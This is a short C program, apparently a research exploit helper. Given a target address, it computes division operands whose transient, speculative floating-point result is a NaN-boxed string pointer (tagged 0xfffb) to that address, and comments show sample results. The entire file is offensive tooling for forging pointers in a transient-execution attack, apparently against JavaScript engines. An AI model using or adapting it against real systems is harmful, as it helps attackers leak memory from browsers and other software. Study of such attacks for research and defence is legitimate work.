#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
//Given a target address this function find the X and Y operands of a division
//that gives as transient result a string pointer to the desired target.
//Ex:
//        x = 0xbffb0deadbeef007       -1.690898e+00    (  NORMAL    biased_exp= 1023    unbiased_exp=    0    mantissa=0xb0deadbeef007)
//        y = 0x0000000000000001       4.940656e-324    (DENORMAL    biased_exp=    0    unbiased_exp=-1022    mantissa=0x0000000000001)
// arch_res = 0xfff0000000000000                -inf    (  NORMAL    biased_exp= 2047    unbiased_exp= 1024    mantissa=0x0000000000000)
//trans_res = 0xfffb0deadbeef000                -nan    (  NORMAL    biased_exp= 2047    unbiased_exp= 1024    mantissa=0xb0deadbeef000)
//
//        x = 0xbffb0deadbeef00f       -1.690898e+00    (  NORMAL    biased_exp= 1023    unbiased_exp=    0    mantissa=0xb0deadbeef00f)
//        y = 0x0000000000000001       4.940656e-324    (DENORMAL    biased_exp=    0    unbiased_exp=-1022    mantissa=0x0000000000001)
// arch_res = 0xfff0000000000000                -inf    (  NORMAL    biased_exp= 2047    unbiased_exp= 1024    mantissa=0x0000000000000)
//trans_res = 0xfffb0deadbeef008                -nan    (  NORMAL    biased_exp= 2047    unbiased_exp= 1024    mantissa=0xb0deadbeef008)
//
// WARNING: due to FPU truncation/rounding logic the last digit of the address must be either 0x0 or 0x8

int main(int argc, char **argv)
{
    uint64_t target;

    if (argc < 2)
    {
        printf("Usage: %s <pointer in hex>\n", argv[0]);
        return -1;
    }

    sscanf(argv[1], "0x%lx", &target);
    target = target & 0x00007ffffffffffULL;
    printf("Finding X,Y for target 0x%016lx\n", target);

    uint64_t yh = 0x0000000000000001ULL;
    double   y  = *((double *) &yh);

    //0xfffb is String tag
    uint64_t xh = 0xbffb000000000000ULL;
    xh = xh | (target & 0x00007ffffffffff0ULL);
    double   x  = *((double *) &xh);

    uint64_t offset = target & 0xfULL;
    if(offset == 0ULL) {
        xh |= 0x7ULL;
    } else if(offset == 8ULL) {
        xh |= 0xfULL;
    } else {
        printf("Only target addresses ending i 0x0 or 0x8 are supported\n");
        return -1;
    }

    printf("X = 0x%016lx\t%.16e\n", xh, x);
    printf("Y = 0x%016lx\t%.16e\n", yh, y);

    return 0;
}
